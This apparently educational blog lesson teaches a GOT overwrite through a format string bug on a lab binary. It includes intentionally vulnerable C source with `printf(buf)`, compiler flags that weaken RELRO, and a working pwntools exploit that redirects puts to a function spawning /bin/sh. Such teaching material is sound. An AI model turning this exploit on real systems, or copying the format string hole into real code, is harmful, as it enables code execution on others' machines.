---
title: "Lesson 8.1: GOT Overwrite to Hijack Function Calls"
image:
  path: /assets/img/covers/pwn-8-1-got-overwrite-hijack-function-calls.webp
  alt: "GOT Overwrite to Hijack Function Calls"
date: 2026-10-10 16:05:00 +0700
categories: ["Binary Exploitation", "Pwn · GOT and PLT"]
tags: [pwn, got, format-string, relro]
render_with_liquid: false
---

This lesson turns an arbitrary-write bug into control flow hijacking by overwriting exactly one pointer, the GOT entry of a libc function. We write the address of `win` over the GOT entry of `puts`, and the program's next call to `puts` lands straight in `win`. We use a format string as the write primitive, running the exploit live on Ubuntu 24.04 to get a shell and a flag.

![GOT overwrite redirecting puts to win](/assets/img/pwn/pwn-8-1-got-overwrite-hijack-function-calls.svg)
_A format string write primitive overwrites puts@got with the address of win, so the next call to puts runs win instead._

**Prerequisites:** Lesson 1.3 (GOT/PLT, lazy binding), Lesson 7.2 (writing memory with `%n`), Lesson 5.1 (RELRO).

**Tools:** pwntools (`fmtstr_payload`, ELF), gdb + pwndbg, objdump, readelf, checksec.

## Goals

By the end you can explain why the GOT is a classic overwrite target for hijacking function calls, understand why this technique needs Partial RELRO (writable GOT) and dies under Full RELRO, use a write primitive (here a format string `%n`) to overwrite a GOT entry, and exploit the lab yourself by turning `puts@got` into `win`, getting a shell, and reading the flag.

## Theory

### GOT/PLT in 30 seconds

Lesson 1.3 laid the groundwork: libc functions (like `puts`, `system`) do not live in your binary, they live in `libc.so.6`. The binary calls them through two tables. The PLT (Procedure Linkage Table) holds stubs in the executable `r-x` region; the GOT (Global Offset Table) is a table of pointers in the writable data region. When code calls `puts`, it actually does `call puts@plt`, and that stub jumps indirectly through the GOT entry for `puts`, as shown below.

```
call puts@plt  ->  puts@plt: jmp QWORD PTR [puts@got]  ->  the real address of puts in libc
```

The key point for this lesson is that the GOT entry is a function pointer sitting in WRITABLE memory. If you can change the contents of the `puts` GOT entry, every later call to `puts` jumps to wherever you wrote. Change `puts@got` to the address of `win`, and the next `puts("...")` call becomes `win()`. That is a GOT overwrite, writing one pointer and redirecting control flow with no need to touch the stack or the saved RIP.

### Why Partial RELRO is required

RELRO (Relocation Read-Only) is the mitigation that decides whether the GOT entry is writable. There are three levels:

- No RELRO: the GOT is fully writable.
- Partial RELRO: `.got` (initialized data) becomes read-only, but `.got.plt` (the function pointer entries used for lazy binding) STAYS writable. A GOT overwrite targets exactly this region, so it still works.
- Full RELRO: the entire GOT is resolved right at startup and then locked read-only. Writing to it gets you a SIGSEGV. GOT overwrite is dead.

This is the thing to remember on glibc 2.39 / Ubuntu 24.04: modern toolchains default to Full RELRO (`gcc` adds `-z now` on its own). That means a binary compiled with default settings on this machine CANNOT have its GOT overwritten. To teach and practice the technique, we have to deliberately drop to Partial RELRO at compile time, as shown below.

```bash
# Partial RELRO: keep lazy binding, .got.plt stays writable
gcc -z relro -z lazy -fno-stack-protector -no-pie -fcf-protection=none ...
```

`-z lazy` keeps lazy binding (no early resolving), and `-z relro` gives Partial rather than Full RELRO. Never use `-z now` or Full RELRO here. Always confirm with `checksec` that you see `RELRO: Partial RELRO` before building an exploit, otherwise you waste time on a GOT that cannot be written.

### Choosing a write primitive: format string

A GOT overwrite is only the last step. Before that you need a write primitive (the ability to write a chosen value to a chosen address). It can come from several different bugs:

- Format string `%n` (Lesson 7.2): `%n` writes the number of characters printed so far into the address an argument points to. Control the count and the address and you have an arbitrary write. This is the primitive this lesson uses.
- A buffer overflow that is itself an arbitrary write (for example a program that reads an index and a value and writes into an array with no bounds check).
- A heap primitive (tcache poisoning, pointing a returned pointer at the GOT), covered in part 9.

Whatever the primitive is, the last step is the same, writing the address of the target function (`win`, or `system`) into the GOT entry of a function that is about to be called.

### Which GOT entry to overwrite

Overwrite the GOT entry of a function the program WILL CALL after you finish writing. This lab's sequence is shown below.

```
puts("...")      // 1st call: resolves puts@got to libc (lazy binding)
printf(buf)      // format string BUG -> overwrites puts@got = &win
puts("goodbye")  // 2nd call: jumps into win() instead of libc puts
```

One subtle trap to avoid: `win` must not call back into the very function you just overwrote. If `win` calls `puts` to print a message, and `puts@got` now points at `win`, you get infinite recursion into `win`. In the lab, `win` uses `write` (a different GOT entry, untouched) to print, then calls `system("/bin/sh")`.

Because the binary is No-PIE, the addresses of `win` and `puts@got` are fixed (no ASLR on the image), so there is nothing to leak. That is why the lab uses No-PIE, so the focus stays on the overwrite mechanism and not on leaking a base address.

## Demo

Test environment: Ubuntu 24.04.4, glibc 2.39, gcc 13.3.0. Binary is No PIE, No canary, NX enabled, Partial RELRO.

Here is the source, `src.c` (core part shortened).

```c
void win(void) {
    // DO NOT use puts here: puts@got was just overwritten to win,
    // calling puts would recurse into win forever.
    write(1, "[win] puts GOT got overwritten, opening a shell:\n", 48);
    system("/bin/sh");
    _exit(0);
}
int main(void) {
    char buf[256];
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("== format string -> GOT overwrite ==");   // 1st call to puts
    printf("enter payload: ");
    int n = read(0, buf, sizeof(buf) - 1);
    if (n > 0) buf[n] = 0;
    printf(buf);          // format string BUG (write primitive)
    puts("goodbye");      // puts@got overwritten -> jumps into win()
    return 0;
}
```

Compile for Partial RELRO as shown in the Lab section below.

```bash
gcc -fno-stack-protector -no-pie -fcf-protection=none -z relro -z lazy -O0 -g -o fmtgot src.c
```

`checksec` confirms the exact setup the lesson needs, as shown below.

```
Arch:       amd64-64-little
RELRO:      Partial RELRO        <- .got.plt is writable
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)    <- fixed addresses, no leak needed
```

### Finding the GOT entry for puts

`objdump -R` lists `JUMP_SLOT` relocations, which are exactly the GOT entries for libc functions, as shown below.

```
$ objdump -R fmtgot | grep JUMP_SLOT
0000000000404008 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5     <- puts@got = 0x404008
0000000000404010 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5    <- write@got (used by win, untouched)
0000000000404018 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5
...
```

And the `puts` PLT stub jumps through exactly that entry, as shown below.

```
$ objdump -d -M intel -j .plt fmtgot | grep -A1 puts@plt
0000000000401040 <puts@plt>:
  401040: ff 25 c2 2f 00 00   jmp QWORD PTR [rip+0x2fc2]   # 404008 <puts@GLIBC_2.2.5>
```

In pwntools you get these quickly: `elf.got['puts']` gives `0x404008`, `elf.sym['win']` gives the address of `win`.

### Finding the format string offset

A format string write only works once you know which argument position of `printf` your buffer sits at, so send an 8-byte marker and probe, as shown below.

```python
io.sendline(b'ABCDEFGH' + b'.'.join(b'%%%d$p' % i for i in range(6, 21)))
# output: ABCDEFGH0x4847464544434241.0x...
#                  ^ marker "ABCDEFGH" shows up at %6$p -> OFFSET = 6
```

`0x4847464544434241` is "ABCDEFGH" read little-endian, and it shows up at `%6$p`. So the buffer starts right at argument 6. That is the number you pass to `fmtstr_payload`.

### Exploit script

`fmtstr_payload(offset, {address: value})` handles the hard part, computing the `%...c` / `%hhn` string to write each byte, and laying out the target addresses at the right position on the stack.

```python
from pwn import *
context.binary = elf = ELF('./fmtgot')

OFFSET = 6
io = process('./fmtgot')
io.recvuntil(b'payload: ')

writes = {elf.got['puts']: elf.sym['win']}         # puts@got = &win
payload = fmtstr_payload(OFFSET, writes, write_size='byte')
io.sendline(payload)

# printf(payload) finished the write to puts@got. puts("goodbye") -> win() -> shell.
io.sendline(b'cat flag.txt; id')
io.interactive()
```

Here is the real output when running it, as recorded in the transcript in the Lab section below.

```
[*] win       = 0x401186
[*] puts@got  = 0x404008
[*] payload len = 64
...
[win] puts GOT got overwritten, opening a shell:
===PWNED_8_1===
uid=0(root) gid=0(root) groups=0(root)
flag{got_overwrite_via_format_string}
===END===
[+] GOT overwrite OK: puts@got -> win(), shell and flag obtained
```

This is exactly as designed. `printf(buf)` uses `%hhn` to write the low 3 bytes of the `win` address over `puts@got`, then `puts("goodbye")` jumps into `win`, which runs `system("/bin/sh")`, giving us a root shell and the flag.

### Watching the GOT entry change in gdb

To see it with your own eyes, set a breakpoint right before `puts("goodbye")` and inspect the GOT entry before and after `printf`, as shown below.

```
pwndbg> x/gx 0x404008      # BEFORE printf: real address of puts in libc (0x7f...)
pwndbg> x/gx 0x404008      # AFTER printf:  0x0000000000401186 <win>  -> overwritten
```

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 8.1</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/8.1.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/8.1/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/8.1/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/8.1/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>

- Challenge: the binary (`fmtgot`), No-PIE, Partial RELRO, with a format string bug via `printf(buf)` and a `win` function.
- Goal: overwrite `puts@got` with `win`, get a shell, and read `flag.txt`.
- Hints, in order:
  - Hint 1: run `checksec` and confirm `Partial RELRO`. Get `elf.got['puts']` and `elf.sym['win']`.
  - Hint 2: find the format string offset with an 8-byte marker plus `%N$p`. This lab gives 6.
  - Hint 3: `fmtstr_payload(offset, {elf.got['puts']: elf.sym['win']})`. Once sent, the call to `puts("goodbye")` runs `win`.
  - Self-check: can you answer "what happens if `win` calls `puts`?" and "why does Full RELRO break this technique?"

## Key takeaways

- A GOT entry is a function pointer in writable memory (under Partial RELRO): change it and you redirect a function call.
- A GOT overwrite needs a write primitive first (format string `%n`, overflow, heap).
- Overwrite the GOT entry of a function that WILL BE CALLED after you write it.
- `win` must not call back into the function you just overwrote (infinite recursion).
- Partial RELRO allows the write, Full RELRO blocks it: always run `checksec` first.
- pwntools: `fmtstr_payload(offset, {elf.got['f']: target})` handles the `%hhn` machinery.

## Common pitfalls

- Binary is Full RELRO. Writing to the GOT is an immediate SIGSEGV. The tell is `checksec` reporting `Full RELRO`. On glibc 2.39 this is the default, so you must recompile with `-z relro -z lazy` to practice the technique.
- Infinite recursion in `win`. `win` prints using the very `puts` you just redirected to `win`. Use `write`, `printf` (a different GOT entry), or drop the print.
- Wrong format string offset. Taking the wrong position makes `%hhn` write garbage. Re-probe with the 8-byte marker and count carefully.
- Overwriting a function that is never called again. If the program does not call `puts` again after your write, control flow never changes. Pick the entry of a function still in use.
- Racing the shell command. If the payload and the shell command are sent in one go, `read` can swallow both and the shell never receives the command. Insert a small delay between the payload and the command (see `exploit.py`).
- `%n` disabled. Some libc builds enable `_FORTIFY_SOURCE` and block `%n` on writable memory. If you hit this, switch primitive or switch target.

## Further reading

- Lesson 7.2: the foundations of writing memory with `%n` and how `fmtstr_payload` builds the string.
- Lesson 1.3: PLT/GOT and lazy binding, to understand why `.got.plt` is writable under Partial RELRO.
- `man ld.so`: `LD_BIND_NOW`, the resolve mechanism, and RELRO.
- Similar challenges: format string problems on pwnable.kr, picoCTF, and the `fmtstr` module on pwn.college.
